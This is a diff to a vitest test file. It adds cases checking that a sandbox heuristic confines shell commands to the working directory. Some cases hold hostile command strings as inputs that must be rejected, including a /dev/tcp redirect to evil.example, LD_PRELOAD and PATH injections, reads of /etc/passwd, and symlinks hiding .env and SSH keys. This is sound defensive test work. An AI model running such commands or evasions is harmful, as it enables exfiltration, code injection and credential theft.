@@ -1,4 +1,7 @@
-import { describe, it, expect } from "vitest";
+import { describe, it, expect, beforeAll, afterAll } from "vitest";
+import fs from "node:fs";
+import os from "node:os";
+import path from "node:path";
 import { getCwdConfinementPermission } from "../../sandbox/heuristics";
 import type { SandboxConfigCwdConfinement } from "../../common/config";
 
@@ -140,6 +143,73 @@ describe("getCwdConfinementPermission", () => {
         ]);
     });
 
+    describe("parser evasion resistance", () => {
+        runTests([
+            { desc: "quoted known command name behaves like bash", command: '"cat" file.txt', expected: "allow:sandbox" },
+            { desc: "quoted unknown command name", command: '"nc" host 80', expected: undefined },
+            { desc: "tab as argument separator", command: "cat\tfile.txt", expected: "allow:sandbox" },
+            { desc: "escaped char in command name resolves like bash", command: "c\\at file.txt", expected: "allow:sandbox" },
+            { desc: "escaped char does not disguise unknown command", command: "n\\c host 80", expected: undefined },
+            { desc: "case-sensitive command names", command: "CAT file.txt", expected: undefined },
+            { desc: "empty quotes prefix", command: '""cat file.txt', expected: "allow:sandbox" },
+            { desc: "bash -c is not a known command", command: 'bash -c "cat file.txt"', expected: undefined },
+            { desc: "sh -c is not a known command", command: "sh -c 'cat file.txt'", expected: undefined },
+            { desc: "eval is not a known command", command: "eval cat file.txt", expected: undefined },
+            { desc: "env wrapper is not a known command", command: "env cat file.txt", expected: undefined },
+            { desc: "command builtin is not a known command", command: "command cat file.txt", expected: undefined },
+            { desc: "xargs is not a known command", command: "xargs cat < files.txt", expected: undefined },
+            { desc: "sudo is not a known command", command: "sudo cat file.txt", expected: undefined },
+            { desc: "time is not a known command", command: "time cat file.txt", expected: undefined },
+        ]);
+    });
+
+    describe("environment assignments", () => {
+        runTests([
+            { desc: "benign assignment", command: "FOO=bar cat file.txt", expected: "allow:sandbox" },
+            { desc: "multiple benign assignments", command: "FOO=bar BAZ=qux cat file.txt", expected: "allow:sandbox" },
+            { desc: "empty assignment value", command: "FOO= cat file.txt", expected: "allow:sandbox" },
+            { desc: "LD_PRELOAD is rejected", command: "LD_PRELOAD=/tmp/evil.so cat file.txt", expected: undefined },
+            { desc: "LD_LIBRARY_PATH is rejected", command: "LD_LIBRARY_PATH=/tmp cat file.txt", expected: undefined },
+            { desc: "PATH assignment is rejected", command: "PATH=/tmp/evil cat file.txt", expected: undefined },
+            { desc: "BASH_ENV is rejected", command: "BASH_ENV=/tmp/x cat file.txt", expected: undefined },
+            { desc: "IFS is rejected", command: "IFS=x cat file.txt", expected: undefined },
+            { desc: "assignment value outside cwd is path-checked", command: "FOO=/etc/passwd cat file.txt", expected: undefined },
+            { desc: "assignment value in home is path-checked", command: "FOO=~/x cat file.txt", expected: undefined },
+            { desc: "sensitive assignment value is rejected", command: "FOO=.env cat file.txt", expected: undefined },
+        ]);
+    });
+
+    describe("redirection edge cases", () => {
+        runTests([
+            { desc: "stderr merged into stdout", command: "cat file.txt 2>&1", expected: "allow:sandbox" },
+            { desc: "stdout to /dev/stdout", command: "echo hello > /dev/stdout", expected: "allow:sandbox" },
+            { desc: "bash network redirect is outside cwd", command: "echo hello > /dev/tcp/evil.example/80", expected: undefined },
+            { desc: ">&2 is conservatively rejected", command: "cat file.txt >&2", expected: undefined },
+            { desc: "1>&2 is conservatively rejected", command: "cat file.txt 1>&2", expected: undefined },
+        ]);
+    });
+
+    describe("unsafe flag variants", () => {
+        runTests([
+            { desc: "sort --compress-program with separate arg", command: "sort --compress-program /tmp/x file.txt", expected: undefined },
+            { desc: "sort --compress-program= inline", command: "sort --compress-program=/tmp/x file.txt", expected: undefined },
+            { desc: "find -ok prompts per match, still unsafe", command: "find . -ok rm {} \\;", expected: undefined },
+            { desc: "grep --dereference-recursive long form", command: "grep --dereference-recursive foo .", expected: undefined },
+            { desc: "grep -r without dereference is allowed", command: "grep -r foo .", expected: "allow:sandbox" },
+            { desc: "sort with safe flags stays allowed", command: "sort -n -k 2 file.txt", expected: "allow:sandbox" },
+        ]);
+    });
+
+    describe("chain edge cases", () => {
+        runTests([
+            { desc: "trailing chain operator", command: "cat file.txt &&", expected: "allow:sandbox" },
+            { desc: "only chain operators", command: "; ; ;", expected: undefined },
+            { desc: "background operator", command: "cat file.txt &", expected: "allow:sandbox" },
+            { desc: "background unknown command", command: "sleep 100 &", expected: undefined },
+            { desc: "second branch escapes cwd", command: "cat file.txt || cat /etc/passwd", expected: undefined },
+        ]);
+    });
+
     describe("sensitive paths", () => {
         runTests([
             { desc: ".env file", command: "cat .env", expected: undefined },
@@ -194,6 +264,90 @@ describe("getCwdConfinementPermission", () => {
                 expected: "allow:sandbox",
             },
         ]);
+    });
+
+    describe("symlink handling (real filesystem)", () => {
+        let dir: string;
+        let aliasDir: string;
+
+        beforeAll(() => {
+            dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-sandbox-heuristics-"));
+
+            fs.mkdirSync(path.join(dir, "realdir"));
+            fs.writeFileSync(path.join(dir, "realdir", "inside.txt"), "x");
+            fs.writeFileSync(path.join(dir, "plain.txt"), "x");
+
+            // link-inside.txt -> realdir/inside.txt (stays within cwd)
+            fs.symlinkSync(path.join("realdir", "inside.txt"), path.join(dir, "link-inside.txt"));
+            // link-outside.txt -> /etc/hostname (escapes cwd)
+            fs.symlinkSync("/etc/hostname", path.join(dir, "link-outside.txt"));
+            // chain: link-chain-src.txt -> link-chain.txt -> /etc/hostname
+            fs.symlinkSync("/etc/hostname", path.join(dir, "link-chain.txt"));
+            fs.symlinkSync("link-chain.txt", path.join(dir, "link-chain-src.txt"));
+            // directory symlinks
+            fs.symlinkSync("realdir", path.join(dir, "dirlink-inside"));
+            fs.symlinkSync("/etc", path.join(dir, "dirlink-outside"));
+            // symlink with innocent name pointing at sensitive file
+            fs.writeFileSync(path.join(dir, ".env"), "SECRET=x");
+            fs.symlinkSync(".env", path.join(dir, "env-link.txt"));
+            // symlink with innocent name pointing at sensitive directory
+            fs.mkdirSync(path.join(dir, ".ssh"));
+            fs.writeFileSync(path.join(dir, ".ssh", "id_rsa"), "KEY");
+            fs.symlinkSync(path.join(".ssh", "id_rsa"), path.join(dir, "notes.txt"));
+            // symlink pointing at the working directory itself
+            aliasDir = path.join(os.tmpdir(), `pi-sandbox-heuristics-alias-${path.basename(dir)}`);
+            fs.symlinkSync(dir, aliasDir);
+
+            // dangling symlink (target does not exist)
+            fs.symlinkSync(path.join(dir, "nonexistent-target-xyz"), path.join(dir, "dangling.txt"));
+        });
+
+        afterAll(() => {
+            fs.rmSync(dir, { recursive: true, force: true });
+            fs.rmSync(aliasDir, { force: true });
+        });
+
+        const runFsTests = (tests: HeuristicTest[]) => {
+            it.each(tests)("$desc", (test) => {
+                expect(
+                    getCwdConfinementPermission(test.command, dir, test.config ?? {}),
+                ).toBe(test.expected);
+            });
+        };
+
+        runFsTests([
+            { desc: "symlink staying within cwd", command: "cat link-inside.txt", expected: "allow:sandbox" },
+            { desc: "symlink escaping cwd", command: "cat link-outside.txt", expected: undefined },
+            { desc: "symlink chain escaping cwd", command: "cat link-chain-src.txt", expected: undefined },
+            { desc: "directory symlink within cwd", command: "ls dirlink-inside", expected: "allow:sandbox" },
+            { desc: "file through inside directory symlink", command: "cat dirlink-inside/inside.txt", expected: "allow:sandbox" },
+            { desc: "directory symlink escaping cwd", command: "ls dirlink-outside", expected: undefined },
+            { desc: "file through outside directory symlink", command: "cat dirlink-outside/hostname", expected: undefined },
+            { desc: "dangling symlink read is rejected", command: "cat dangling.txt", expected: undefined },
+            { desc: "dangling symlink write is rejected", command: "echo x > dangling.txt", expected: undefined },
+            { desc: "plain file", command: "cat plain.txt", expected: "allow:sandbox" },
+            { desc: "new write target in existing cwd", command: "echo x > newfile.txt", expected: "allow:sandbox" },
+            { desc: "new write target in new subdirectory", command: "echo x > newdir/file.txt", expected: "allow:sandbox" },
+            { desc: "find follows symlinks with -L: falls back", command: "find . -L -name foo", expected: undefined },
+            { desc: "find without -L stays allowed", command: "find . -name foo", expected: "allow:sandbox" },
+            { desc: "symlink hiding a sensitive file is rejected", command: "cat env-link.txt", expected: undefined },
+            { desc: "symlink hiding a sensitive directory target is rejected", command: "cat notes.txt", expected: undefined },
+            { desc: "grep -R follows traversal symlinks: falls back", command: "grep -R foo .", expected: undefined },
+            { desc: "grep -r does not follow traversal symlinks: allowed", command: "grep -r foo .", expected: "allow:sandbox" },
+            { desc: "du -L follows symlinks: falls back", command: "du -L .", expected: undefined },
+            { desc: "tree -l follows symlinks: falls back", command: "tree -l", expected: undefined },
+            {
+                desc: "resolveSymlinks: false disables the realpath check",
+                command: "cat link-outside.txt",
+                config: { resolveSymlinks: false },
+                expected: "allow:sandbox",
+            },
+        ]);
+
+        it("cwd reached through a symlink still works", () => {
+            expect(getCwdConfinementPermission("cat plain.txt", aliasDir, {})).toBe("allow:sandbox");
+            expect(getCwdConfinementPermission("cat /etc/hostname", aliasDir, {})).toBe(undefined);
+        });
     });
 
     describe("configuration", () => {
